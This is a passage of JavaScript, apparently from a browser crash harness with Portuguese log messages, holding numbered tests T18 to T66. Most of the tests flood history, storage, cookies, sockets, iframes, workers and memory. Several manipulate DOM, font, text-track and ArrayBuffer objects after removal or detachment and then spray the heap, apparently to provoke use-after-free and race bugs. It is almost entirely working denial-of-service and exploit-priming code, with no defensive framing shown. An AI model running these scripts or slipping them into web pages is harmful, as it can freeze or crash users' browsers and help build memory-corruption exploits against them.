    log("Iniciando T18: History State OOM...");
    var stateObj = { data: "X".repeat(1024*10) }; 
    var count = 0;
    var t = setInterval(function() {
        try {
            history.pushState(stateObj, "Page " + count, "?p=" + count);
            count++;
            if(count % 500 === 0) log(".. History length: " + history.length);
        } catch(e) {
            clearInterval(t);
            log(">> T18 Erro/Limite: " + e.message);
        }
        if(count > 10000) clearInterval(t);
    }, 1);
}

function runTest19() {
    log("Iniciando T19: Storage Quota DoS...");
    localStorage.clear();
    var chunk = "A".repeat(1024 * 100); 
    var keys = [];
    try {
        for(var i=0; i<1000; i++) {
            var key = "k" + i;
            localStorage.setItem(key, chunk);
            keys.push(key);
        }
    } catch(e) {
        log(">> T19 Quota Atingida: " + e.message);
        try {
            var huge = new Array(keys.length).fill(chunk);
            localStorage.setItem("killer", huge.join('')); 
        } catch(z) {}
    }
    log(">> T19: Itens gravados: " + keys.length);
}

function runTest20() {
    log("Iniciando T20: Iframe Churn Panic...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    var frames = 0;
    
    var loop = setInterval(function() {
        for(var i=0; i<10; i++) {
            var ifr = document.createElement('iframe');
            container.appendChild(ifr);
            try {
                var d = ifr.contentDocument;
                d.open();
                d.write("<html><body>" + "<div></div>".repeat(100) + "</body></html>");
                d.close();
            } catch(e){}
            
            if(frames % 3 === 0) {
                container.removeChild(container.firstChild);
            }
            frames++;
        }
        if(frames % 200 === 0) log(".. Frames processados: " + frames);
        
        if(frames > 3000) {
            clearInterval(loop);
            log(">> T20: Churn finalizado.");
        }
    }, 50);
}
function runTest21() {
    log("Iniciando T21: Selection API Use-After-Free...");
    var sel = window.getSelection();
    var range = document.createRange();
    var div = document.createElement('div');
    div.innerHTML = "<span>A</span><span>B</span><span>C</span>";
    document.body.appendChild(div);
    range.selectNode(div.firstChild);
    sel.addRange(range);
    
    try {
        for(var i=0; i<100; i++) {
            var f = document.createDocumentFragment();
            f.appendChild(document.createElement('b'));
            range.insertNode(f);
            sel.extend(div.lastChild, 0);
            
            if(i % 10 === 0) {
                div.innerHTML = ""; 
                var junk = new Uint32Array(1024).fill(0x13371337);
            }
            sel.removeAllRanges();
            sel.addRange(range);
        }
    } catch(e) {
        log(">> T21 Exception: " + e.message);
    }
    document.body.removeChild(div);
    log(">> T21 Finalizado: Selection/Range Stress.");
}

function runTest22() {
    log("Iniciando T22: Map Iterator Invalidation...");
    var m = new Map();
    for(var i=0; i<1000; i++) m.set(i, {id: i, buffer: new Uint8Array(64)});
    var iter = m.entries();
    var steps = 0;
    
    try {
        var item;
        while(!(item = iter.next()).done) {
            steps++;
            if(steps % 50 === 0) {
                for(var j=0; j<100; j++) m.delete(steps + j);
                for(var k=0; k<200; k++) m.set("n"+k, new ArrayBuffer(128));
                
                var spray = []; 
                for(var x=0; x<50; x++) spray.push({a:1, b:item.value});
            }
            if(steps > 5000) break;
        }
        log(">> T22 Iterator: Steps processed " + steps);
    } catch(e) {
        log(">> T22 Crash Logic: " + e.message);
    }
}

function runTest23() {
    log("Iniciando T23: Rope String Flattening...");
    var s = "Root";
    var rope = [];
    var parts = ["A", "B", "C", "D"];
    
    try {
        for(var i=0; i<20000; i++) {
            s += parts[i % 4] + i; 
        }
        rope.push(s);
        
        var s2 = s.substring(100, 20000); 
        var s3 = s2.toUpperCase(); 
        
        var trigger = s3.indexOf("C100"); 
        
        if(trigger > -1) {
            var atom = s.substring(0, 10); 
            var memory = new Uint8Array(1024*1024*5); 
            log(">> T23 Rope: String flattened & searched. Len: " + s.length);
        }
    } catch(e) { log(">> T23 Erro: " + e); }
}

function runTest24() {
    log("Iniciando T24: AudioTrackList Race...");
    var v = document.createElement('video');
    var store = [];
    
    var t = setInterval(function() {
        if(v.audioTracks) { 
            log(">> T24: AudioTracks API presente.");
            // Lógica específica se a API existir
        } else {
            // Fallback para elementos de áudio padrão
            for(var i=0; i<50; i++) {
                var a = new Audio();
                a.src = "dummy" + i + ".mp3";
                store.push(a);
                a.onloadedmetadata = function() {
                    this.src = ""; 
                    store.shift(); 
                };
            }
        }
        
        if(store.length > 500) {
            store = []; 
            var heavy = new Float64Array(10000).fill(1.23);
        }
        
        if(store.length > 2000) clearInterval(t);
    }, 50);
    setTimeout(function(){ clearInterval(t); log(">> T24 Concluído (Race Attempt)."); }, 2000);
}

function runTest25() {
    log("Iniciando T25: HTMLCollection NamedItem...");
    var form = document.createElement('form');
    document.body.appendChild(form);
    var names = ["id", "name", "toString", "length", "item", "namedItem"];
    
    try {
        for(var i=0; i<1000; i++) {
            var input = document.createElement('input');
            input.setAttribute('name', names[i % names.length]);
            input.setAttribute('id', 'val' + i);
            form.appendChild(input);
        }
        
        var collision = form.elements['toString']; 
        var len = form.elements['length']; 
        
        form.innerHTML = ""; 
        var spray = new Array(500).fill(1.1);
        
        log(">> T25: Element lookup stress performed.");
    } catch(e) { log(">> T25 Erro: " + e); }
    document.body.removeChild(form);
}

function runTest26() {
    log("Iniciando T26: Timer Heap Flood...");
    var timers = [];
    var count = 0;
    
    function recursiveTimer() {
        count++;
        var t = setTimeout(function() {
            var x = new Uint8Array(1024); 
            if(count % 2 === 0) recursiveTimer();
        }, 10 + (count % 50));
        timers.push(t);
        
        if(timers.length > 5000) {
            timers.splice(0, 1000).forEach(clearTimeout); 
        }
    }
    
    for(var i=0; i<100; i++) recursiveTimer();
    
    setTimeout(function() {
        timers.forEach(clearTimeout);
        log(">> T26: Timers active max: " + count);
    }, 3000);
}

function runTest27() {
    log("Iniciando T27: Canvas Path Vertex OOM...");
    var c = document.createElement('canvas');
    c.width = 2048; c.height = 2048;
    var ctx = c.getContext('2d');
    
    if(ctx) {
        ctx.beginPath();
        try {
            for(var i=0; i<50000; i++) {
                ctx.moveTo(Math.random()*2000, Math.random()*2000);
                ctx.lineTo(Math.random()*2000, Math.random()*2000);
                ctx.bezierCurveTo(i, i, i+10, i+10, 500, 500);
                
                if(i % 10000 === 0) {
                    var data = ctx.getImageData(0,0,10,10); 
                    log(".. Path vertices: " + i);
                }
            }
            ctx.fill(); 
        } catch(e) {
            log(">> T27 GPU Panic: " + e.message);
        }
    }
    log(">> T27: Complex path render sent.");
}

function runTest28() {
    log("Iniciando T28: Cookie Buffer Overflow...");
    var base = "val=" + "B".repeat(4000) + "; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT;";
    var count = 0;
    
    try {
        var t = setInterval(function() {
            document.cookie = "id" + count + "=" + base;
            count++;
            
            if(count % 50 === 0) {
                var c = document.cookie; 
                if(c.length > 50000) {
                    var all = document.cookie.split(';');
                    for(var i=0; i<all.length; i++) {
                        document.cookie = all[i] + "; expires=Thu, 01 Jan 1970 00:00:00 GMT";
                    }
                }
            }
            if(count > 500) {
                clearInterval(t);
                log(">> T28: Cookie flood stop. Total ops: " + count);
            }
        }, 5);
    } catch(e) { log(">> T28 Erro: " + e); }
}

function runTest29() {
    log("Iniciando T29: Attribute Node Exhaustion...");
    var el = document.createElement('div');
    var attrs = [];
    
    try {
        for(var i=0; i<15000; i++) {
            var name = "data-val-" + i;
            var val = "x".repeat(50); 
            el.setAttribute(name, val);
            attrs.push(name);
        }
        
        var clone = el.cloneNode(true); 
        document.body.appendChild(clone);
        
        var junk = clone.outerHTML.length; 
        document.body.removeChild(clone);
        log(">> T29: Attributes set: " + attrs.length);
        
    } catch(e) {
        log(">> T29 Resource Limit: " + e.message);
    }
}

function runTest30() {
    log("Iniciando T30: Socket Leak (Img Src)...");
    var imgs = [];
    var portStart = 30000;
    
    var loop = setInterval(function() {
        for(var i=0; i<20; i++) {
            var img = new Image();
            // Tenta conectar em IPs/Portas que seguram a conexão (SYN_SENT) ou falham lentamente
            img.src = "http://127.0.0.1:" + (portStart + i) + "/junk"; 
            imgs.push(img);
        }
        portStart += 20;
        
        if(imgs.length > 1000) {
            // Drop references without aborting via src="" to keep kernel socket open
            imgs = []; 
            imgs.length = 0;
        }
        
        if(portStart > 32000) {
            clearInterval(loop);
            log(">> T30: Socket flood finished.");
        }
    }, 50);
}
function runTest31() {
    log("Iniciando T31: XSLT Processor Recursion...");
    var xmlString = "<root>" + "<a>data</a>".repeat(100) + "</root>";
    var xslString = '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/">';
    xslString += '<xsl:for-each select="//a"><xsl:copy-of select="."/></xsl:for-each>';
    xslString += '</xsl:template></xsl:stylesheet>';
    
    try {
        var parser = new DOMParser();
        var xml = parser.parseFromString(xmlString, "text/xml");
        var xsl = parser.parseFromString(xslString, "text/xml");
        var processor = new XSLTProcessor();
        processor.importStylesheet(xsl);
        
        var f = document.createDocumentFragment();
        for(var i=0; i<500; i++) {
            var res = processor.transformToFragment(xml, document);
            f.appendChild(res);
            if(i % 100 === 0) {
                var spray = new Array(200).fill(1.1); 
            }
        }
        log(">> T31: XSLT Operations completed.");
    } catch(e) { log(">> T31 Erro: " + e.message); }
}

function runTest32() {
    log("Iniciando T32: MutationObserver Infinite Loop...");
    var target = document.createElement('div');
    document.body.appendChild(target);
    var count = 0;
    
    var obs = new MutationObserver(function(mutations) {
        count++;
        mutations.forEach(function(m) {
            var leak = document.createElement('span');
            leak.textContent = "L".repeat(100); 
            if(count < 2000) {
                target.setAttribute('data-x', count);
                target.appendChild(leak);
            }
        });
    });
    
    obs.observe(target, { attributes: true, childList: true, subtree: true });
    target.setAttribute('data-x', 'start');
    
    setTimeout(function() {
        obs.disconnect();
        target.innerHTML = "";
        document.body.removeChild(target);
        log(">> T32: Observer triggers triggered: " + count);
    }, 2000);
}

function runTest33() {
    log("Iniciando T33: Cross-Doc Node Adoption...");
    var doc1 = document.implementation.createHTMLDocument("doc1");
    var doc2 = document.implementation.createHTMLDocument("doc2");
    var nodePool = [];
    
    try {
        for(var i=0; i<500; i++) {
            var n = doc1.createElement('div');
            n.id = "node_" + i;
            doc1.body.appendChild(n);
            nodePool.push(n);
        }
        
        var iter = 0;
        var i = setInterval(function() {
            for(var j=0; j<50; j++) {
                if(nodePool.length > 0) {
                    var n = nodePool.shift();
                    doc2.adoptNode(n); 
                    doc2.body.appendChild(n);
                    
                    n.setAttribute("adopted", "true");
                    doc1.adoptNode(n); 
                }
            }
            iter++;
            if(iter > 20) {
                clearInterval(i);
                log(">> T33: Node adoption cycle finished.");
            }
        }, 50);
    } catch(e) { log(">> T33 Erro: " + e); }
}

function runTest34() {
    log("Iniciando T34: CSS Calc Deep Nesting...");
    var el = document.createElement('div');
    document.body.appendChild(el);
    var depth = 200;
    var style = "10px";
    
    for(var i=0; i<depth; i++) {
        style = "calc(1px + " + style + ")";
    }
    
    try {
        el.style.width = style;
        var computed = window.getComputedStyle(el).width;
        
        var styles = [];
        for(var k=0; k<1000; k++) {
            var d = document.createElement('div');
            d.style.width = style; 
            styles.push(d);
        }
        log(">> T34: CSS Calc Parse OK. Depth: " + depth);
    } catch(e) {
        log(">> T34 Parser Crash: " + e.message);
    }
    document.body.removeChild(el);
}

function runTest35() {
    log("Iniciando T35: RegExp Cache Poisoning...");
    var cache = [];
    try {
        for(var i=0; i<5000; i++) {
            var p = "(a|b|c)" + i + ".*[x-z]"; 
            var r = new RegExp(p);
            r.test("testing string for cache entry " + i);
            
            if(i % 100 === 0) {
                cache.push(r); 
            }
        }
        
        var stress = new RegExp("((a+)+)+");
        stress.exec("aaaaaaaaaaaaaaaaaaaaa"); 
        
        log(">> T35: RegExp Cache filled with " + i + " entries.");
    } catch(e) { log(">> T35 Erro: " + e); }
}

function runTest36() {
    log("Iniciando T36: Prototype Chain Bomb...");
    var root = {};
    var curr = root;
    var depth = 0;
    
    try {
        while(depth < 8000) {
            var next = {};
            Object.setPrototypeOf(curr, next);
            curr = next;
            depth++;
            if(depth % 1000 === 0) {
                curr.someProp = new Uint8Array(100).fill(1);
            }
        }
        var search = root.someProp; 
        log(">> T36: Proto Chain Depth: " + depth);
    } catch(e) {
        log(">> T36 Engine Limit: " + e.message);
    }
}

function runTest37() {
    log("Iniciando T37: Huge String Join (OOM)...");
    var parts = 200000;
    var filler = "A".repeat(1024); 
    
    try {
        var arr = new Array(parts);
        log(".. Allocating array elements...");
        for(var i=0; i<100; i++) arr[i] = filler; 
        
        log(".. Attempting Join...");
        var massive = arr.join("B"); 
        
        log(">> T37: Join Success (Len: " + massive.length + ")");
    } catch(e) {
        log(">> T37 Allocation Failed: " + e.message);
        var cleanup = new ArrayBuffer(1024*1024); 
    }
}

function runTest38() {
    log("Iniciando T38: Unaligned DataView Stress...");
    var buffer = new ArrayBuffer(0x10000); 
    var view = new DataView(buffer);
    var count = 0;
    
    try {
        for(var i=0; i<buffer.byteLength - 8; i+=1) { 
            view.setFloat64(i, 1.23456789, true);
            var v = view.getFloat64(i, true);
            
            if(i % 4096 === 4095) { 
                var pageCross = view.getInt32(i, true); 
                count++;
            }
        }
        var sprays = [];
        for(var k=0; k<1000; k++) sprays.push(new DataView(new ArrayBuffer(128)));
        
        log(">> T38: Unaligned ops: " + count + " pages crossed.");
    } catch(e) { log(">> T38 Erro: " + e); }
}

function runTest39() {
    log("Iniciando T39: Event Listener Exhaustion...");
    var el = document.createElement('button');
    var count = 0;
    var functions = [];
    
    try {
        for(var i=0; i<20000; i++) {
            var fn = function() { return i; };
            el.addEventListener('click', fn);
            functions.push(fn); 
            count++;
        }
        
        el.click(); 
        
        for(var j=0; j<functions.length; j++) {
            el.removeEventListener('click', functions[j]);
        }
        log(">> T39: Listeners added/removed: " + count);
    } catch(e) {
        log(">> T39 Resource Limit: " + e.message);
    }
}

function runTest40() {
    log("Iniciando T40: Null Object Property Spray...");
    var container = [];
    var spraySize = 50000;
    
    try {
        log(".. Creating null-proto objects...");
        for(var i=0; i<spraySize; i++) {
            var obj = Object.create(null);
            obj["p" + i] = i;
            obj["buffer"] = new ArrayBuffer(16);
            if(i % 2 === 0) obj["padding"] = "P".repeat(32);
            container.push(obj);
        }
        
        var finder = container[spraySize-1]["p" + (spraySize-1)];
        
        container = null; 
        var reclaim = new Uint32Array(1024*1024).fill(0xCC);
        
        log(">> T40: Objects sprayed: " + spraySize);
    } catch(e) { log(">> T40 Erro: " + e); }
}
function runTest41() {
    log("Iniciando T41: FontFaceSet UAF...");
    var f = new FontFace('t', 'url(data:font/woff;base64,d09GRgABAAAA...)');
    document.fonts.add(f);
    var arr = [];
    var spray = [];
    
    try {
        f.load().then(function() {
            document.fonts.delete(f);
            var b = new Uint8Array(200).fill(0x41);
        }, function(){});
        
        for(var i=0; i<1000; i++) {
            var face = new FontFace('f'+i, 'url(#)');
            document.fonts.add(face);
            arr.push(face);
            if(i % 50 === 0) {
                document.fonts.clear();
                spray.push(new ArrayBuffer(0x100)); 
            }
        }
        var it = document.fonts.keys();
        var next = it.next(); 
        log(">> T41: Font iterators stressed.");
    } catch(e) { log(">> T41 Erro: " + e.message); }
}

function runTest42() {
    log("Iniciando T42: Worker Transferable Race...");
    var workers = [];
    var buffers = [];
    
    for(var i=0; i<8; i++) { 
        var b = new Blob(["onmessage=function(e){postMessage(e.data, [e.data]);}"], {type:'application/javascript'});
        var w = new Worker(URL.createObjectURL(b));
        workers.push(w);
    }
    
    var interval = setInterval(function() {
        for(var j=0; j<workers.length; j++) {
            try {
                var buf = new ArrayBuffer(1024 * 1024);
                workers[j].postMessage(buf, [buf]);
                
                if(Math.random() > 0.8) {
                    workers[j].terminate();
                    workers[j] = new Worker(URL.createObjectURL(new Blob([""], {type:'js'})));
                }
            } catch(e) {}
        }
    }, 10);
    
    setTimeout(function() {
        clearInterval(interval);
        log(">> T42: Worker race finished.");
    }, 4000);
}

function runTest43() {
    log("Iniciando T43: NodeIterator Detach...");
    var root = document.createElement('div');
    root.innerHTML = "<span><a><b>text</b></a></span>".repeat(100);
    document.body.appendChild(root);
    
    var ni = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT, null, false);
    var node;
    var count = 0;
    
    try {
        while((node = ni.nextNode())) {
            count++;
            if(count % 20 === 0) {
                var r = document.createRange();
                r.selectNode(node);
                r.deleteContents(); 
                
                var junk = document.createElement('div');
                junk.setAttribute('a', 'x'.repeat(1000));
                
                node.textContent = "A"; 
            }
        }
    } catch(e) { log(">> T43 Logic: " + e.message); }
    
    document.body.removeChild(root);
    log(">> T43: NodeIterator traversal attempted.");
}

function runTest44() {
    log("Iniciando T44: Array Splice Proxy Trap...");
    var a = [1, 2, 3, 4];
    var p = new Proxy(a, {
        get: function(target, prop) {
            if (prop === 'length') {
                target[1000] = 100; 
                var spray = [];
                for(var i=0; i<5000; i++) spray.push({a: 1, b: new Uint8Array(64)});
                return target.length;
            }
            return target[prop];
        }
    });
    
    try {
        Array.prototype.splice.call(p, 0, 1);
        log(">> T44: Splice executed on Proxy.");
    } catch(e) {
        log(">> T44 Crash Vector: " + e.message);
    }
}

function runTest45() {
    log("Iniciando T45: TextTrack Cue Invalidation...");
    var v = document.createElement('video');
    var t = v.addTextTrack("subtitles", "Test", "en");
    t.mode = "showing";
    var cues = [];
    
    try {
        for(var i=0; i<500; i++) {
            var c = new VTTCue(i, i+1, "Text " + i);
            t.addCue(c);
            cues.push(c);
        }
        
        for(var j=0; j<cues.length; j++) {
            t.removeCue(cues[j]);
            cues[j].text = "MODIFIED AFTER REMOVAL"; 
            cues[j].line = 5;
            
            if(j % 50 === 0) {
                var heavy = new Uint32Array(1024).fill(0xDEADBEEF);
            }
        }
        log(">> T45: Cues manipulated post-removal.");
    } catch(e) { log(">> T45 Erro: " + e.message); }
}

function runTest46() {
    log("Iniciando T46: Sync XHR Thread Lock...");
    var count = 0;
    var max = 50; 
    
    var t = setInterval(function() {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", window.location.href + "?nocache=" + Math.random(), false); 
            xhr.send(null);
            count++;
            
            if(count > max) {
                clearInterval(t);
                log(">> T46: Sync Requests sent: " + count);
            }
        } catch(e) {
            log(">> T46 Net Error: " + e.message);
        }
    }, 10); 
}

function runTest47() {
    log("Iniciando T47: History State Flood...");
    var junk = "A".repeat(1024 * 512); 
    var i = 0;
    
    try {
        while(i < 5000) {
            history.pushState({data: junk}, "S" + i, "/?s=" + i);
            i++;
            if(i % 100 === 0) {
                var f = document.createElement('div'); 
                f = null;
            }
        }
    } catch(e) {
        log(">> T47 Memory Limit/Crash: " + e.message);
    }
}

function runTest48() {
    log("Iniciando T48: Storage I/O Thrashing...");
    localStorage.clear();
    var val = "X".repeat(1024 * 50); 
    var running = true;
    
    setTimeout(function(){ running = false; log(">> T48: I/O Stop."); }, 4000);
    
    var loop = function() {
        if(!running) return;
        try {
            for(var i=0; i<50; i++) {
                localStorage.setItem("key"+i, val);
            }
            for(var i=0; i<50; i++) {
                localStorage.removeItem("key"+i);
            }
            setTimeout(loop, 0); 
        } catch(e) { log(">> T48 Erro: " + e.message); }
    };
    loop();
}

function runTest49() {
    log("Iniciando T49: Recursive Iframe Stack...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    var depth = 0;
    
    function dive(parent) {
        depth++;
        if(depth > 500) return; 
        
        var ifr = document.createElement('iframe');
        parent.appendChild(ifr);
        
        try {
            var d = ifr.contentDocument;
            d.open();
            d.write("<div>Depth " + depth + "</div>");
            d.close();
            
            setTimeout(function() { dive(d.body); }, 0);
        } catch(e) {}
    }
    
    dive(container);
    log(">> T49: Recursion initiated.");
}

function runTest50() {
    log("Iniciando T50: URL Object Handle Leak...");
    var blobs = [];
    var urls = [];
    var data = new Uint8Array(1024).fill(1);
    
    var t = setInterval(function() {
        for(var i=0; i<500; i++) {
            var b = new Blob([data]);
            var u = URL.createObjectURL(b);
            urls.push(u); 
            
            if(urls.length % 10000 === 0) {
                log(".. Handles open: " + urls.length);
            }
        }
        
        if(urls.length > 100000) {
            clearInterval(t);
            log(">> T50: Handle exhaustion limit.");
        }
    }, 50);
}
function runTest51() {
    log("Iniciando T51: Document.write Re-entrancy...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    var d = f.contentDocument;
    
    try {
        d.open();
        d.write('<script>parent.log(".. Frame Script Executing"); window.location.reload();<\/script>');
        
        var s = document.createElement('script');
        s.textContent = "document.write('<h1>OVERWRITTEN</h1>');";
        d.body.appendChild(s); 
        
        for(var i=0; i<100; i++) {
            d.write("<div>" + "A".repeat(1000) + "</div>");
            if(i === 50) {
                f.src = "about:blank"; 
                var junk = new Uint32Array(0x4000).fill(0x1337);
            }
        }
        d.close();
    } catch(e) { log(">> T51 Logic: " + e.message); }
    
    setTimeout(function() { 
        if(document.body.contains(f)) document.body.removeChild(f);
        log(">> T51: Write operations finished.");
    }, 2000);
}

function runTest52() {
    log("Iniciando T52: AdoptNode Getter Poison...");
    var docA = document.implementation.createHTMLDocument("A");
    var docB = document.implementation.createHTMLDocument("B");
    var div = docA.createElement("div");
    docA.body.appendChild(div);
    
    var poison = {
        get id() {
            if(div.parentNode) div.parentNode.removeChild(div);
            var spray = [];
            for(var k=0; k<1000; k++) spray.push(new Uint8Array(255).fill(0xCC)); 
            return "poison";
        }
    };
    
    try {
        Object.defineProperty(div, "id", poison);
        for(var i=0; i<500; i++) {
            var clone = docA.createElement("div");
            docA.body.appendChild(clone);
            docB.adoptNode(clone); 
        }
        docB.adoptNode(div); 
        log(">> T52: Adoption trap executed.");
    } catch(e) { log(">> T52 Erro: " + e.message); }
}

function runTest53() {
    log("Iniciando T53: RegExp Replace Mutation...");
    var str = "A".repeat(10000);
    var regex = /A/g;
    var count = 0;
    
    var victim = {
        toString: function() {
            count++;
            if(count % 100 === 0) {
                str = null; 
                var heavy = new ArrayBuffer(0x100000); 
                return "B";
            }
            return "A";
        }
    };
    
    try {
        regex.lastIndex = 5000;
        var res = str.replace(regex, victim);
        
        var check = [];
        for(var i=0; i<200; i++) check.push(res.substr(i*10, 10));
        
        log(">> T53: RegExp replace cycle done. Count: " + count);
    } catch(e) {
        log(">> T53 Crash Logic: " + e.message);
    }
}

function runTest54() {
    log("Iniciando T54: Prototype Hijack Spray...");
    var original = Node.prototype.appendChild;
    var count = 0;
    
    Node.prototype.appendChild = function(arg) {
        count++;
        if(count % 50 === 0) {
            var arr = new Array(100);
            for(var i=0; i<100; i++) arr[i] = document.createElement('span');
        }
        return original.apply(this, arguments);
    };
    
    try {
        var root = document.createElement('div');
        for(var j=0; j<2000; j++) {
            var el = document.createElement('div');
            root.appendChild(el); 
        }
        
        Node.prototype.appendChild = original; 
        log(">> T54: Hijack calls processed: " + count);
    } catch(e) {
        Node.prototype.appendChild = original;
        log(">> T54 Erro: " + e.message);
    }
}

function runTest55() {
    log("Iniciando T55: CSS Rule Insert Race...");
    var style = document.createElement('style');
    document.head.appendChild(style);
    var sheet = style.sheet;
    var running = true;
    
    setTimeout(function() { running = false; log(">> T55: Race stop."); }, 3000);
    
    function spam() {
        if(!running) return;
        try {
            for(var i=0; i<100; i++) {
                sheet.insertRule("#id" + i + " { color: red; }", 0);
                var rules = sheet.cssRules; 
                if(rules.length > 50) sheet.deleteRule(rules.length - 1);
            }
            // Força recalculo de estilo
            var x = document.body.offsetHeight;
            setTimeout(spam, 0);
        } catch(e) { log(">> T55 Error: " + e.message); }
    }
    spam();
}

function runTest56() {
    log("Iniciando T56: XHR FD Leak...");
    var reqs = [];
    var t = setInterval(function() {
        try {
            for(var i=0; i<20; i++) {
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "/", true);
                xhr.send();
                reqs.push(xhr); 
            }
            if(reqs.length > 3500) {
                log(".. Active XHRs: " + reqs.length);
                if(reqs.length > 10000) clearInterval(t);
            }
        } catch(e) {
            clearInterval(t);
            log(">> T56 Kernel Limit: " + e.message);
        }
    }, 50);
}

function runTest57() {
    log("Iniciando T57: Recursive Blob Expansion...");
    var blobs = [new Blob(["start"], {type: "text/plain"})];
    
    try {
        for(var i=0; i<25; i++) { 
            var next = [];
            for(var j=0; j<blobs.length; j++) {
                next.push(new Blob([blobs[j], blobs[j]], {type: "application/octet-stream"}));
            }
            blobs = next;
            log(".. Level " + i + ": " + blobs.length + " blobs");
            
            if(i > 15) { 
               var u = URL.createObjectURL(blobs[0]); 
            }
        }
        log(">> T57: Exponential Blob created.");
    } catch(e) {
        log(">> T57 Memory Fail: " + e.message);
        blobs = null; 
    }
}

function runTest58() {
    log("Iniciando T58: Window Name Huge Alloc...");
    var base = "A".repeat(1024 * 1024); 
    var huge = "";
    
    try {
        log(".. Building string...");
        for(var i=0; i<50; i++) {
            huge += base;
        }
        window.name = huge; 
        
        var check = window.name.length;
        log(">> T58: Window.name set to " + check + " bytes.");
        
        history.pushState(null, huge.substring(0, 100), "#" + huge.substring(0, 1000));
        
    } catch(e) {
        log(">> T58 Alloc Fail: " + e.message);
    }
    window.name = ""; 
}

function runTest59() {
    log("Iniciando T59: Heap Priming Fragmentation...");
    var buffer = [];
    var primes = [4093, 8191, 16381, 32749, 65521]; 
    
    try {
        for(var i=0; i<5000; i++) {
            var size = primes[i % primes.length];
            var ab = new ArrayBuffer(size);
            var view = new Uint8Array(ab);
            view[0] = i & 0xFF;
            view[size-1] = 0xAA;
            
            buffer.push(ab);
            
            // Cria buracos na memória para dificultar alocação contígua do kernel
            if(i % 3 === 0) {
                buffer[i] = null;
            }
        }
        
        var tryHuge = new ArrayBuffer(1024 * 1024 * 64); 
        log(">> T59: Heap fragmented & huge alloc attempted.");
    } catch(e) {
        log(">> T59 OOM Triggered: " + e.message);
    }
}

function runTest60() {
    log("Iniciando T60: Iframe Srcdoc Thread Bomb...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    var count = 0;
    
    var html = "<html><body><script>for(var i=0;i<10000;i++)Math.random();<\/script></body></html>";
    
    var i = setInterval(function() {
        for(var k=0; k<10; k++) {
            var ifr = document.createElement('iframe');
            ifr.srcdoc = html;
            container.appendChild(ifr);
            count++;
            
            if(count % 500 === 0) {
                container.innerHTML = ""; 
                log(".. Frames cycled: " + count);
            }
        }
        if(count > 5000) {
            clearInterval(i);
            log(">> T60: Thread bomb finished.");
        }
    }, 20);
}
function runTest61() {
    log("Iniciando T61: DataView Detach Race...");
    var ab = new ArrayBuffer(1024);
    var dv = new DataView(ab);
    var workerBlob = new Blob(['onmessage = function(e) { postMessage("pong"); }'], {type: 'application/javascript'});
    var w = new Worker(URL.createObjectURL(workerBlob));
    
    try {
        var race = setInterval(function() {
            w.postMessage(ab, [ab]); 
            try {
                dv.setInt32(0, 0x41414141); 
            } catch(e) {}
            
            if(ab.byteLength === 0) {
                ab = new ArrayBuffer(1024);
                dv = new DataView(ab);
                // Heap Spray para preencher o local liberado
                var spray = new Array(100).fill(new Uint8Array(1024));
            }
        }, 0);
        
        setTimeout(function() {
            clearInterval(race);
            w.terminate();
            log(">> T61: Race finished.");
        }, 3000);
    } catch(e) { log(">> T61 Error: " + e.message); }
}

function runTest62() {
    log("Iniciando T62: Promise Rejection Flood...");
    var count = 0;
    
    function rejector() {
        return new Promise(function(resolve, reject) {
            reject("Force Fail");
        });
    }
    
    var t = setInterval(function() {
        for(var i=0; i<100; i++) {
            rejector().catch(function(e) {
                count++;
                if(count % 1000 === 0) {
                   // Cria pressão no Microtask Queue
                   var junk = [];
                   for(var k=0; k<500; k++) junk.push({a:1}); 
                }
            });
        }
        if(count > 20000) {
            clearInterval(t);
            log(">> T62: Microtask queue stressed.");
        }
    }, 10);
}

function runTest63() {
    log("Iniciando T63: Object.defineProperty Loop...");
    var target = {};
    var i = 0;
    
    try {
        while(i < 5000) {
            var prop = "p" + i;
            Object.defineProperty(target, prop, {
                get: function() { 
                    var heavy = new Uint32Array(100).fill(0x12345678);
                    return i; 
                },
                configurable: true,
                enumerable: true
            });
            i++;
        }
        
        // Força enumeração massiva chamando todos os getters
        var keys = Object.keys(target);
        var sum = 0;
        for(var k in target) { sum += target[k]; }
        
        log(">> T63: Properties defined and accessed: " + i);
    } catch(e) {
        log(">> T63 Engine Limit: " + e.message);
    }
}

function runTest64() {
    log("Iniciando T64: Canvas Pattern Recursion...");
    var c = document.createElement('canvas');
    c.width = 100; c.height = 100;
    var ctx = c.getContext('2d');
    
    try {
        var pattern = ctx.createPattern(c, 'repeat');
        var arrays = [];
        
        for(var i=0; i<500; i++) {
            var c2 = document.createElement('canvas');
            c2.width = 100 + i; c2.height = 100;
            var ctx2 = c2.getContext('2d');
            ctx2.fillStyle = pattern;
            ctx2.fillRect(0,0,100,100);
            
            pattern = ctx.createPattern(c2, 'repeat'); 
            
            if(i % 50 === 0) {
                var imgData = ctx2.getImageData(0,0,10,10);
                arrays.push(imgData);
            }
        }
        log(">> T64: Pattern recursion depth reached.");
    } catch(e) {
        log(">> T64 Graphics Fail: " + e.message);
    }
}

function runTest65() {
    log("Iniciando T65: Filter Function Context Swap...");
    var arr = new Array(10000).fill(1);
    var count = 0;
    
    var proxy = new Proxy({}, {
        get: function(t, k) { return 1; },
        has: function(t, k) {
            arr.length = 0; 
            var spray = new Array(5000).fill(1.1);
            return true;
        }
    });
    
    try {
        arr.filter(function(element, index, array) {
            count++;
            if(index === 500) {
                // Troca o contexto 'this' no meio da execução
                arguments[2] = proxy; 
                var x = array[index+1]; 
            }
            return true;
        }, proxy);
        log(">> T65: Filter survived. Count: " + count);
    } catch(e) { log(">> T65 Error: " + e.message); }
}

function runTest66() {
    log("Iniciando T66: Huge ArrayBuffer Map Fail...");
    var buffers = [];
    var totalAlloc = 0;
    
    try {
        var loop = setInterval(function() {
            // Tenta alocar blocos de 128MB (pode falhar no kernel mapping)
            var size = 1024 * 1024 * 128; 
            var ab = new ArrayBuffer(size);
            var view = new Uint8Array(ab);
            view[0] = 1; 
            view[size-1] = 1;
            
            buffers.push(ab);
            totalAlloc += 128;
            log(".. Alloc: " + totalAlloc + " MB");
            
            if(totalAlloc > 3000) { // Tenta passar de 3GB (limite usual de userland)
